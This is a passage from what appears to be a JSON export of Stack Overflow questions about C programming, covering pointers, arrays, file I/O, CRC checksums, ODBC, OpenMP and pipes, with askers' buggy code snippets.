array.</p>\n\n<pre><code>int *theFunction()\n{\nint a[]={1,2,3,4,5};\nreturn a;\n}\n</code></pre>\n\n<p>I want to store the result of the function in a pointer.</p>\n\n<pre><code>int *a=theFunction();\n</code></pre>\n\n<p>How do I print the array, is it even possible?\nThe length of the array isn't known, is there a way to find it?</p>\n"},{"tags":["c","append","stdio"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":35,"score":2,"question_id":13212603,"title":"in append/update mode is a call to a file positioning function still required?","body":"<p>After opening a file in <em>append update</em> mode, is it necessary to execute a file positioning statement before each write to the file?</p>\n\n<pre><code>FILE *h;\nint ch;\nif ((h = fopen(\"data\", \"a+\")) == NULL) exit(1);\nif (fseek(h, 0 SEEK_SET)) exit(2);\nch = fgetc(h); /* read very first character */\nif (ch == EOF) exit(3);\n\n/* redundant? mandatory? */\nfseek(h, 0, SEEK_END); /* call file positioning before output */\n\n/* add 1st character to the end of file on a single line*/\nfprintf(h, \"%c\\n\", ch);\n</code></pre>\n\n<p>The <a href=\"http://www.open-std.org/JTC1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow\">C11 Standard</a> says:</p>\n\n<blockquote>\n  <p>7.21.5.3/6 ...  all subsequent writes to the file to be forced to the then current end-of-file ...</p>\n</blockquote>\n\n<p>and</p>\n\n<blockquote>\n  <p>7.21.5.3/7 ...  input shall not be directly followed by output without an\n  intervening call to a file positioning function ...</p>\n</blockquote>\n\n<p>I take it the <strong>shall</strong> in 7.21.5.3/7 is stronger than the description in 7.21.5.3/6.</p>\n"},{"tags":["c++","c","zip","zlib"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":9141070,"title":"Is out there any tutorial on how to unzip a zip file with folders and files inside into some dir and pack them back via MiniZip?","body":"<p>Is out there any C/C++ tutorial on how to unzip a zip file with folders and files inside into some dir and pack them back via  MiniZip?</p>\n"},{"tags":["c","constants"],"answer_count":3,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":87,"score":4,"question_id":13212298,"title":"const in C giving unpredictable output","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/945640/constants-and-pointers-in-c\">constants and pointers in C</a>  </p>\n</blockquote>\n\n\n\n<p>I have this little piece of code. I am using a gcc compiler: </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    const int a=10;\n    int *d;\n    d=&amp;a;\n    *d=30;\n    printf(\"%d %d\\n\",a,*d);\n    return 0;\n}\n</code></pre>\n\n<p>It gives a warning on compiling: </p>\n\n<blockquote>\n  <p>\"assignment discards qualifiers from pointer target type\" </p>\n</blockquote>\n\n<p>But no error. The output is: 30 30</p>\n\n<p>Then doesn't it defy the purpose of maintaining a const variable whose value is fixed throughout the program execution (please correct me if I am wrong)? </p>\n"},{"tags":["c","loops","for-loop","series","floating"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":13212292,"title":"Loop ends early, produces negative value for a loop counter (when i=1; ++i)","body":"<p>This is my first C homework, so my error might be something really obvious to you, and I apologize in advance if that's the case. However, this seemed quite unusual to me (not just working, but having some weird output), so I thought I should probably ask around. I'm trying to calculate the sum of the alternating harmonic series. This is the function that's supposed to do it (it returns a double). </p>\n\n<pre><code>    double series(void){\n\n    double sum = 0.0;\n    int i,x;\n\n    for (i = 1; i &gt; 0 ; i = i+1)\n    {\n\n            if (sum - (sum - 1.0/x) == 0 || sum - (sum + 1.0/x) == 0)\n            {\n                    printf(\"To infinity and beyond... almost!\\n\");\n                    return sum;\n            }\n            else if (i % 2 != 0)\n            {\n                    sum = sum - 1.0/x;\n            }\n            else if (i % 2 == 0)\n            {\n                    sum = sum + 1.0/x;\n            }\n            else\n            {\n            printf(\"How did I end up here?\\n\");\n            }\n\n    }\n\n    printf(\"I ESCAPED THE LOOP\\n\");\n    return 1.0*i;\n</code></pre>\n\n<p>}</p>\n\n<p>And when I run the program, it always ends up in the last few lines (prints the line I ESCAPED THE LOOP, so the for loop ends, while it's supposed to run until the first if condition is met. Last line isn't meant to be reached). And the output -- the return value of the function -- is -21473822648.000000 for i. A negative number (actually the output in main is positive, but it's multiplied by minus one in there and removing the -1.0 does nothing more than change the sign to the one it shouldn't be), when the only things that change i should be i=1 and ++i in the for loop introduction . How does that happen? The only things that main does is call for the function, set a double's value as the negative of the return value of the function and prints that value. </p>\n\n<p>And I just realized that the order of operations in the if() statement might be wrong, but I fixed it with extra parentheses around everything. It had no effect.</p>\n\n<p>Oh, and this is actually not the whole problem, I'm actually supposed to find out which are the best and worst orders of summation. I just wanted to see whether I could even write a program that does it. Any links to floating point arithmetic related material and such would be appreciated.</p>\n\n<p>Thanks in advance for all and any advice anyone might have.</p>\n"},{"tags":["c","recursion"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":63,"score":3,"question_id":13212780,"title":"Tricky recursive function 007","body":"<p>Elo, I got this code snippet from an old exam. It's tricky and I need some help figuring out how it prints \"007\".</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n/* Desmond Llewelyns */\nint M(int Q);\nint main(void)\n {\n\n   M(9);\n   return 0;\n }\nint M(int Q)\n {\n   if(Q&gt;1) \n     if(M(Q-1)==0)\n       printf(\"%03d\\n\", Q);\n\n   return Q-6;\n } \n</code></pre>\n"},{"tags":["c","multidimensional-array","initialization"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13212351,"title":"Unusual initialization trouble","body":"<p>All</p>\n\n<p>I am writing a very simple C code of dynamic 2D array declaration and initializing it with <code>memset</code> and then printing out the value. My code is something as follows:</p>\n\n<pre><code>float **env;\nint i,j,num;\n\nprintf(\"Enter a number : \\n\");\nscanf(\"%d\",&amp;num);\n\nenv = (float **)malloc(num*sizeof(float *));\n\nfor(i=0;i&lt;num;i++)\n{env[i] = (float *)malloc(num*sizeof(float));}\n\nmemset(env, 0, sizeof(float)*num*num);\n\nfor(i=0;i&lt;num;i++)\n{  for (j=0;j&lt;num;j++)\n   {\n      printf(\"%f\\t\",env[i][j]);\n      if (j == num -1)\n       { printf(\"\\n\\n\");}\n    }\n}\n\nfor(i=0;i&lt;num;i++)\n{free(env[i]);\n}\n\nfree(env);\n</code></pre>\n\n<p>When I compile the program, there is no compile error or warning, but when I try to print out the values I am not able to print them. Then I debugged the program, and after the <code>memset</code> statement the env 2D variable is showing something like \n<code>CXX0030: Error: expression cannot be evaluated</code>, and when I print the values a window appears showing </p>\n\n<p><code>Unhandled exception at 0x008b1e27 in ***.exe: 0xC0000005: Access violation reading location 0x00000000.</code></p>\n\n<p>I have tried explicitly initializing the 2D array env to 0 using 2 for loops and it works perfectly and I am also able to print the values, but it doesn't work when I use <code>memset</code>. It would be very helpful if somebody could help me out. Thank you.</p>\n"},{"tags":["c","strcat"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13212354,"title":"How to use strcat with a char* of an unspecified length","body":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nchar* changeString(char *inputString);\n\nint main() {\n   printf(\"Changed string is %s\\n\", changeString(\"42\"));\n}\n\nchar* changeString(char *inputString) {\n    static const char* someStrings[3] = {\"abc\", \"def\", \"ghi\"};\n    char* output;\n    strcat(output, someStrings[1]);\n    return output;\n}\n</code></pre>\n\n<p>I'm trying to append a <code>char*</code> to another <code>char*</code> however the <code>strcat</code> keeps resulting in a segmentation fault because the <code>char*</code> has no size, changing <code>char* output;</code> to <code>char output[100];</code> fixes the segmentation fault, but then I am returning the wrong type and I can't print the answer in <code>printf</code>.</p>\n\n<p>Any advice would be much appreciated.</p>\n\n<p>EDIT: I know the example above seems to do nothing of value, I changed it to demonstrate the logic I am using.</p>\n"},{"tags":["javascript","c","svg","geometry"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":65,"score":0,"question_id":13136256,"title":"Javascript equivalencies of C language (*, f, -> and some more)","body":"<p>I found a code <a href=\"http://devmaster.net/forums/topic/4947-transforming-an-ellipse/\" rel=\"nofollow\">from internet</a> and try to understand it. I don't know what is the programming language of the code and try to find javascript equivalencies or workarounds.</p>\n\n<p>A) Which language is in question?</p>\n\n<hr>\n\n<pre><code>*a_offsetrot = PI / 4.0f;\n</code></pre>\n\n<p>B) What is the meaning of '*' in above and what is the possible Javascript equivalence?</p>\n\n<p>C) What is the meaning of 'f' and what is the possible Javascript equivalence?</p>\n\n<hr>\n\n<pre><code>if (K&lt;0) K = 0; else K = (float)sqrt (K);\n</code></pre>\n\n<p>D) What is the meaning of '(float)' and what is the possible Javascript equivalence?</p>\n\n<hr>\n\n<pre><code>*a_offsetrot = 0.5f * (float)atan2(B,ac);\n</code></pre>\n\n<p>E) What is the meaning of \"atan2\" and what is the possible Javascript equivalence?</p>\n\n<hr>\n\n<pre><code>void Ellipse_Transform (float * a_rh, float * a_rv, float *a_offsetrot, Vector2 * endpoint, matrix * a_mat, int *a_ReverseWinding)\n</code></pre>\n\n<p>F) What is the meaning of 'Vector2 * endpoint' and is there possible Javascript equivalence? Is Vector2 a thing that has two (x,y)-points or only one (x,y)-point?</p>\n\n<hr>\n\n<pre><code>m[0] = a_mat-&gt;m[0] * +rh * c + a_mat-&gt;m[3] * rh * s;\n</code></pre>\n\n<p>G) What is the meaning of 'a_mat->m[0]' and what is the possible Javascript equivalence?</p>\n\n<h2>EDIT: Updated title to be more meaningful.</h2>\n\n<p>EDIT2: Thanks to constructive answer of <a href=\"http://stackoverflow.com/a/13136379/1691517\">@rid</a> I got the C language code translated to Javascript and it is <a href=\"http://stackoverflow.com/a/13102801/1691517\">HERE</a> and full working functional example is <a href=\"http://jsbin.com/oqojan/73\" rel=\"nofollow\">HERE</a>.</p>\n"},{"tags":["java","c","crc"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":72,"score":0,"question_id":13209364,"title":"Convert C CRC16 to Java CRC16","body":"<p>Im currently working on on a project, having an embedded system sending data to a pc via radio. The packets get a crc16 checksum at then end and its calculated based on this algorithm:</p>\n\n<pre><code>uint16_t crc16 (const uint8_t * buffer, uint32_t size) {\n    uint16_t crc = 0xFFFF;\n\n    if (buffer &amp;&amp; size)\n        while (size--)\n        {\n            crc = (crc &gt;&gt; 8) | (crc &lt;&lt; 8);\n            crc ^= *buffer++;\n            crc ^= ((unsigned char) crc) &gt;&gt; 4;\n            crc ^= crc &lt;&lt; 12;\n            crc ^= (crc &amp; 0xFF) &lt;&lt; 5;\n        }\n\n    return crc;\n}\n</code></pre>\n\n<p>No Im looking for an aquivalent in Java. I already found a good one:\n<a href=\"http://introcs.cs.princeton.edu/java/51data/CRC16CCITT.java.html\" rel=\"nofollow\">http://introcs.cs.princeton.edu/java/51data/CRC16CCITT.java.html</a></p>\n\n<pre><code>public class CRC16CCITT { \n\n    public static void main(String[] args) { \n        int crc = 0xFFFF;          // initial value\n        int polynomial = 0x1021;   // 0001 0000 0010 0001  (0, 5, 12) \n\n        // byte[] testBytes = \"123456789\".getBytes(\"ASCII\");\n\n        byte[] bytes = args[0].getBytes();\n\n        for (byte b : bytes) {\n            for (int i = 0; i &lt; 8; i++) {\n                boolean bit = ((b   &gt;&gt; (7-i) &amp; 1) == 1);\n                boolean c15 = ((crc &gt;&gt; 15    &amp; 1) == 1);\n                crc &lt;&lt;= 1;\n                if (c15 ^ bit) crc ^= polynomial;\n             }\n        }\n\n        crc &amp;= 0xffff;\n        System.out.println(\"CRC16-CCITT = \" + Integer.toHexString(crc));\n    }\n\n}\n</code></pre>\n\n<p>But this doesnt work with my C Code.</p>\n\n<p>Is anybody able to deliver an adaption or solution for a C and Java aequivalent algorithm?\nThank you!</p>\n"},{"tags":["c","memory","heap"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13212163,"title":"Application not using Lookaside List","body":"<p>Using Dev-C++ 4.9.2. I'm allocating a new heap via HeapCreate, then doing two HeapAlloc's (to allocate two heap segments), then free'ing the second heap segment via HeapFree... This is all on Windows XP SP3. When I'm doing free'ing the second heap segment, instead of going to the LookAside List (LAL) like it should, it instead merges the second segment with unallocated memory in the heap. So I just end up with one heap segment still alloc'ed and no second segment at all. When I should end up with one heap segment alloc'ed and the second segment on the LAL. </p>\n\n<p>Any ideas?</p>\n\n<p>I'm using some basic heap overflow code (Trying to understand how Heap Overflows work in order to code safer) from <a href=\"http://www.net-ninja.net/article/2011/Sep/03/heap-overflows-for-humans-102/\" rel=\"nofollow\">http://www.net-ninja.net/article/2011/Sep/03/heap-overflows-for-humans-102/</a> and I've compiled it using Dev-C++ 4.9.2. </p>\n"},{"tags":["c","linux"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":13211839,"title":"why scheduler is returning priority value 0 in linux","body":"<p>I am trying to assign the max priority allowed for SCHED_RR policy on kernel 3.2.23-rt37.56.el6rt.x86_64. The code is as shown below. The max_prio_for_policy on line 7 and 8 is zero. What is wrong in the code?</p>\n\n<pre><code>    pthread_t thId = pthread_self();\n    pthread_attr_t theAttr;\n    int policy = SCHED_RR;\n    int max_prio_for_policy = 0;\n\n    pthread_attr_init(&amp;theAttr);\n    pthread_attr_getschedpolicy(&amp;theAttr, &amp;policy);\n    max_prio_for_policy = sched_get_priority_max(policy);\n\n    printf(\"setting thread priority to: %d\\n\", max_prio_for_policy);\n</code></pre>\n\n<p>UPDATE: I ran this code on both kernel 3.2.23-rt37.56.el6rt.x86_64 and 2.6.32-279.el6.x86_64, and found the result to be the same.</p>\n\n<p>SOLVED:  i was doing #include \"linux/sched.h\" as opposed to \"sched.h\"</p>\n"},{"tags":["c++","c","types","preprocessor","checking"],"answer_count":7,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":272,"score":5,"question_id":8977176,"title":"Is there way to check the type of a preprocessor symbol value in C/C++","body":"<p>Parts of my code depend on the value of a preprocessor symbol:</p>\n\n<pre><code>int a()\n{\n#if SDK_VERSION &gt;= 3\n    return 1;\n#else\n    return 2;\n#endif\n}\n</code></pre>\n\n<p>The comparison depends of the value of SDK_VERSION. It is expected to be a integer or something that compares to a integer, in this case, 3. If SDK_VERSION is something that cannot be compared to a integer, there will be a compile error.</p>\n\n<p>Is there a way to abort the compilation if SDK_VERSION is not of an expected type? For example:</p>\n\n<pre><code>#if type(SDK_VERSION) != int  # Does not compile, I know\n#error \"SDK_VERSION must be an integer.\"\n#endif\n</code></pre>\n"},{"tags":["c++","c","comma"],"answer_count":20,"favorite_count":6,"up_vote_count":33,"down_vote_count":1,"view_count":6084,"score":32,"question_id":1613230,"title":"Uses of C comma operator","body":"<p>You see it used in for loop statements, but it's legal syntax anywhere.  What uses have you found for it elsewhere, if any?</p>\n"},{"tags":["c","arguments"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":13211819,"title":"C argument conversion","body":"<p>First,I have to say that I am new to C programming. What I'm trying to do is write a program that takes an argument input and converts it into an integer and then returns its value. My code looks like this:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main (int argc, char *argv[])\n{\n   int fromArgv = NULL;  /* holds value from argv[1] */\n   fromArgv = atoi (argv[1]);    /* convert argv[1] to int */\n\n   /* if incorrect no. of arguments entered */\n   if (argc != 2) {\n   fprintf (stderr, \"error: wrong number of arguments\\n\");\n   exit (EXIT_FAILURE);\n   } \n\n   return fromArgv;\n}\n</code></pre>\n\n<p>I get the following error when trying to compile: </p>\n\n<pre><code>ex1.c: In function ‘main’:\nex1.c:6:18: error: initialization makes integer from pointer without a cast [-Werror]\ncc1: all warnings being treated as errors\n</code></pre>\n"},{"tags":["c","matrix","multiple"],"answer_count":1,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":60,"score":3,"question_id":13205320,"title":"Recommend a c library calculating the product of two sparse matrix(size: 100000*100000)","body":"<p>The matrix is so large<code>(size: 100000*100000)</code> which consume two much, so the library should  use triplet or other way to store it. I search the Internet, but those library always  use <code>common matrix</code> not <code>triplet</code> or other way to <code>compress the storage</code>. </p>\n\n<p>It didn't work for me. Can someone recommend some <code>c library</code> for me?</p>\n\n<p>Thank you for your help.</p>\n"},{"tags":["c","linux","gcc"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":1,"view_count":76,"score":4,"question_id":13208935,"title":"How do I disable the volatile storage class using command-line options to the compiler?","body":"<p>Is there any way to disable the volatile storage class using only compiler settings/flags  while compiling in gcc <em>without modifying the underlying source code</em>?</p>\n\n<p>Ex.</p>\n\n<pre><code>volatile int x;\n.. use x ..\n</code></pre>\n\n<p>Needs to be compiled as if it were written:</p>\n\n<pre><code>int x;\n.. use x ..\n</code></pre>\n"},{"tags":["c","linux"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":70,"score":3,"question_id":13211455,"title":"What's wrong with my under-linux c prog: \"ls -al | tr a-z A-Z > file.txt\"?","body":"<p>I'm very new with linux and so. I can't get my script working. I'm just guessing, that the program is getting suspended at executing tr function.</p>\n\n<pre><code>#include &lt;fcntl.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nint main()\n{\n\nint pdesc[2];\npipe(pdesc);\n\nint a = fork();\n\nif (a == 0) // child\n    {\n\n    dup2(pdesc[1],1); // chaning std_out to pipes_out\n    execlp(\"ls\", \"ls\", \"-l\", \"-a\", NULL);\n\n    }\nelse       //parent\n    {\n    wait();\n    int file1 = open(\"file.txt\", O_WRONLY|O_CREAT|O_TRUNC,0777);\n    dup2(pdesc[0], 0); // chaning std_in to pipes_in\n    dup2(file1, 1); // chaning std_out to file's stream\n    execlp(\"tr\", \"tr\", \"a-z\", \"A-Z\", NULL);\n    }\n\n\n\nreturn 0;\n}\n</code></pre>\n"},{"tags":["c","include","sleep"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13211700,"title":"Why I am getting undefined reference to sleep error?","body":"<p>Code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nstruct subscriber {\n    char phonenumber[20];\n    char name[50];\n    float amount;\n} s;\n\nvoid addrecords();\nvoid listrecords();\nvoid modifyrecords();\nvoid deleterecords();\nvoid searchrecords();\nvoid payment();\n\nchar get;\n\nint main()\n{\n    int password;\n    int phonenumber;\n    char choice;\n\n    system(\"cls\");\n\n    printf\n    (\"\\n\\n\\n\\n\\n\\n\\n\\n\\n**********************************************************************\");\n    printf(\"\\n\\t\\t---WELCOME TO THE TELECOM BILLING MANAGEMENT SYSTEM---\");\n    printf(\"\\n\\t\\t****************************************************************\");\n\n    Sleep(2000);\n\n    getch();\n\n    system(\"cls\");\n\n    while (1) {\n        system(\"cls\");\n        printf(\"\\n enter\\n A : for adding new records.\\n L : for list of records\");\n        printf(\"\\n M : for modifying records.\\n P : for payment\");\n        printf(\"\\n S : for searching records.\");\n        printf(\"\\n D : for deleting records.\\n E : for exit\\n\");\n\n        choice = getche();\n        choice = toupper(choice);\n\n        switch (choice) {\n        case 'P':\n            payment();\n        break;\n\n        case 'A':\n            addrecords();\n            break;\n\n        case 'L':\n            listrecords();\n            break;\n\n        case 'M':\n            modifyrecords();\n            break;\n\n        case 'S':\n            searchrecords();\n            break;\n\n        case 'D':\n            deleterecords();\n            break;\n\n        case 'E':\n            system(\"cls\");\n            printf(\"\\n\\n\\t\\t\\t\\tTHANK YOU\");\n            printf(\"\\n\\n\\n\\n\\n:\\n\\tFOR USING OUR SERVICE\");\n            Sleep(2000);\n            exit(0);\n            break;\n\n        default:\n            system(\"cls\");\n            printf(\"Incorrect Input\");\n            printf(\"\\nAny key to continue\");\n            getch();\n\n        }\n\n    }\n\n}\n</code></pre>\n\n<p>Error:</p>\n\n<pre><code>proj.c:(.text+0x53): undefined reference to `Sleep'\nproj.c:(.text+0x5d): undefined reference to `getch'\nproj.c:(.text+0xbb): undefined reference to `getche'\nproj.c:(.text+0x17f): undefined reference to `Sleep'\nproj.c:(.text+0x1c1): undefined reference to `getch'\n/tmp/cc4UYi0H.o: In function `addrecords':\nproj.c:(.text+0x244): undefined reference to `getch'\nproj.c:(.text+0x340): undefined reference to `getche'\n/tmp/cc4UYi0H.o: In function `listrecords':\nproj.c:(.text+0x44c): undefined reference to `getch'\n/tmp/cc4UYi0H.o: In function `deleterecords':\nproj.c:(.text+0x5b2): undefined reference to `getch'\nproj.c:(.text+0x632): undefined reference to `getch'\n/tmp/cc4UYi0H.o: In function `searchrecords':\nproj.c:(.text+0x791): undefined reference to `getch'\n/tmp/cc4UYi0H.o: In function `payment':\nproj.c:(.text+0xb1f): undefined reference to `getch'\ncollect2: ld returned 1 exit status\n</code></pre>\n\n<p>I tried the solution given here ( <a href=\"http://stackoverflow.com/questions/8764295/undefined-reference-to-sleep-but-i-did-include-unistd-h\">Undefined reference to &quot;sleep&quot; but I did include &lt;unistd.h&gt;</a> ) but it's still not working. I am using gcc on Ubuntu 12.04.</p>\n"},{"tags":["c"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":66,"score":2,"question_id":13211548,"title":"In C what exactly happens if i use () to initialize a double dimension array instead of the {}?","body":"<p>When I initialize an array <code>a[][]</code>:</p>\n\n<pre><code>int a[2][5]={(8,9,7,67,11),(7,8,9,199,89)};\n</code></pre>\n\n<p>and then display the array elements.</p>\n\n<p>Why do I get:</p>\n\n<pre><code>11 89 0 0 0 \n0 0 0 0 0\n</code></pre>\n\n<p>What happens if you use curly braces instead of the first brackets here?</p>\n"},{"tags":["c","arrays","string","function","replace"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":81,"score":3,"question_id":13209015,"title":"change string array content with function in C","body":"<p>So I am really new to C programming and trying to replace a string to a date from a file i read and then write it to an other file.\nBut the problem is that when i write it into the file the string remains the same.</p>\n\n<p>What I want is to read this from a file:</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n&lt;!--#include file=”date”--&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>Output file</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\nSat Nov 3 14:43:53 2012\n&lt;/head&gt;\n&lt;body&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>I get an error: passing argument 1 in date_change from incompatible pointer type </p>\n\n<p>Code</p>\n\n<p>//System date replacement function</p>\n\n<pre><code>void *date_change(char** s, char* str, char* date){\n\n    static char buffer[4096];\n    char *p;\n\n    if(!(p = strstr(*s, str)))  // &lt;!--#echo var=\\\"date\\\"--&gt; find this\n       return *s;\n\n    strncpy(buffer, *s, p-*s); //\n    buffer[p-*s] = '\\0';\n\n    sprintf(buffer+(p-*s), \"%s%s\", date, p+strlen(str));\n\n    return buffer;\n}\n</code></pre>\n\n<p>//main</p>\n\n<pre><code>int main(int argc, char *argv[]){\n    int f;\n\n    f = open(argv[1], O_RDONLY);\n\n    if(errno != 0){\n        perror(\"Hiba\");\n        exit(1);\n    }\n\n    //read from file\n    char c[1000];\n    while(read(f,&amp;c, 1000)){\n\n    }\n</code></pre>\n\n<p>// --------------------------------//\nGet the System date and trying to replace it with the date_change function</p>\n\n<pre><code>    time_t mytime;\n    mytime = time(NULL);\n    struct tm *time = localtime(&amp;mytime);\n    char date[20];\n    strftime(date, sizeof(date), \"%c\", time); //format time as string\n\n    char* date_str;\n\n    int g = open(\"data.txt\", O_WRONLY | O_CREAT, 0600);\n\n    //should replace all &lt;!--#echo var=\\\"date\\\" --&gt; to the system date\n    while(date_str = strstr(c, \"&lt;!--#echo var=\\\"date\\\"--&gt;\")){\n           date_change(&amp;c, date_str, date);\n    }\n    write(g, c, strlen(c));\n\n    close(g);\n</code></pre>\n\n<p>// -------------------------------- //</p>\n\n<pre><code>    close(f);\n    return 0;\n}\n</code></pre>\n"},{"tags":["sql","c","odbc"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":13208087,"title":"exactly what does the statement handle(hstmt) do? in ODBC","body":"<p>I`m new to write c code for ODBC \nbut here I have question...\nafter searching for the tutorial for odbc function tutorials for C, I still caanot get exactly\nhow they work collaborately...</p>\n\n<p>what does the statement handle hstmt exactly do for database data?\nI knew it controls the SQL query statements that I give as a parameter. but,,\nthen every SQL statements that i give as query should have each statement handle(hstmt) for each of them? or one statement handle for several SQL query statements?</p>\n\n<p>for example,</p>\n\n<pre><code>lstrcpy((LPTSTR)update, L\"insert into employee values  ('Dshong','summer','LosAngeles');\");\nSQLExecDirect(hstmt1, update, SQL_NTS);\n\nlstrcpy((LPTSTR)update, L\"insert into works values ('Dshong','Small Bank',    2500);\");\nSQLExecDirect(hstmt3, update1, SQL_NTS);\n\nlstrcpy((LPTSTR)select, L\"select * from works;\");\nif (SQLExecDirect(hstmt, select, SQL_NTS) != SQL_SUCCESS)\n    return printf(\"can’t exec direct\");\n\n\nlstrcpy((LPTSTR)select1, L\"select * from employee;\");\nif (SQLExecDirect(hstmt2, select1, SQL_NTS) != SQL_SUCCESS)\n    return printf(\"can’t exec direct\");\n</code></pre>\n\n<p>should I give like this for two insert statements and two select statements with four hstmt?</p>\n\n<p>and if I give like this,</p>\n\n<pre><code>lstrcpy((LPTSTR)insert, L\"insert into employee values ('Dshong','summer','LosAngeles');\");\nSQLExecDirect(hstmt1, insert, SQL_NTS);\n</code></pre>\n\n<p>the SQLExecDirect has hstmt1 as parameter but I don`t know how SQLExecDirect works with it..</p>\n\n<p>And as I think, the result should be one line inserted, isnt it?</p>\n\n<p>but when I run the code, it inserts multi-same rows for <code>('Dshong','summer','LosAngeles')</code>...\nwhen I printed out the result, <code>('Dshong','summer','LosAngeles')</code> was inserted multiple times \neven though the insert line was not in the for loop or so...</p>\n\n<p>and how they work together with the functions below? </p>\n\n<ul>\n<li><code>SQLBindCol(hstmt, 1, SQL_C_CHAR, id, (SDWORD)sizeof(id), &amp;idlen);</code></li>\n<li><code>SQLFetch(hstmt)</code></li>\n</ul>\n\n<p>I know what they simply doing but.. here I want to know exactly in which way \nhstmt ( statement handle) work with them..</p>\n\n<p>thank you..\n:)</p>\n"},{"tags":["c++","c","linux","dll","mono"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":13211224,"title":"Using Linux C code and header files to compile a Windows DLL","body":"<p>I would like to know if in general it is possible to create a C++ DLL with Visual C++ 2010 starting from C code and the header files I find in a Linux distribution. </p>\n\n<p>Theoretically, if I take a piece of C code (that includes different header files) from Linux and I find in the Linux file system all the header files needed for the linkage of the project, will I be able to successfully compile the project in Windows with Visual C++ 2010? </p>\n\n<p>Are there some examples or a tutorial for doing this?</p>\n\n<p>After compiling a DLL, I would like to use it in a C# application, which I will run under Linux with Mono.</p>\n"},{"tags":["c","multithreading","parallel-processing","openmp"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":13209686,"title":"openMP:why am I not getting different thread ids when i uses \" #pragma omp parallel num_threads(4)\"","body":"<p>Why am I not getting different thread ids when I uses \" #pragma omp parallel num_threads(4)\". All the thread ids are 0 in this case. \nBut when I comment the line and use default number of threads, I got different thread ids.\nNote:- variable I used variable tid to get thread id.</p>\n\n<pre><code>#include &lt;omp.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main (int argc, char *argv[]) \n{\nint nthreads, tid;\nint x = 0;\n\n#pragma omp parallel num_threads(4)\n#pragma omp parallel private(nthreads, tid)\n  {\n  /* Obtain thread number */\n tid = omp_get_thread_num();\n  printf(\"Hello World from thread = %d\\n\", tid);\n\n  // /* Only master thread does this */\n   if (tid == 0) \n     {\n     nthreads = omp_get_num_threads();\n     printf(\"Number of threads = %d\\n\", nthreads);\n     }\n\n  }\n\n\n}\n</code></pre>\n\n<p>Output of above code:-</p>\n\n<p>Hello World from thread = 0</p>\n\n<p>Hello World from thread = 0</p>\n\n<p>Number of threads = 1</p>\n\n<p>Hello World from thread = 0</p>\n\n<p>Number of threads = 1</p>\n\n<p>Hello World from thread = 0</p>\n\n<p>Number of threads = 1</p>\n\n<p>Number of threads = 1</p>\n\n<p>Output when I comment the line mentioned above:-\nHello World from thread = 3</p>\n\n<p>Hello World from thread = 0</p>\n\n<p>Number of threads = 4</p>\n\n<p>Hello World from thread = 1</p>\n\n<p>Hello World from thread = 2</p>\n"},{"tags":["c","pointers","casting","struct"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":89,"score":3,"question_id":13210741,"title":"Casting a struct to a pointer type that points to its first element","body":"<p>While looking at:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/13210239/can-a-c-compiler-add-padding-before-the-first-element-in-a-structure\">Can a C compiler add padding before the first element in a structure?</a></p>\n\n<p>I came up with the following code:<br>\n(Ignore the fact that memory isn't freed in this example.)</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\ntypedef struct {\n    char *cstr;\n    size_t len;\n} str_t;\n\nvoid setStr(str_t* dest, const char* src)\n{\n    size_t len = strlen(src);\n    dest-&gt;cstr = malloc(len + 1);\n    dest-&gt;len = len;\n    memcpy(dest-&gt;cstr, src, len + 1);\n}\n\nint 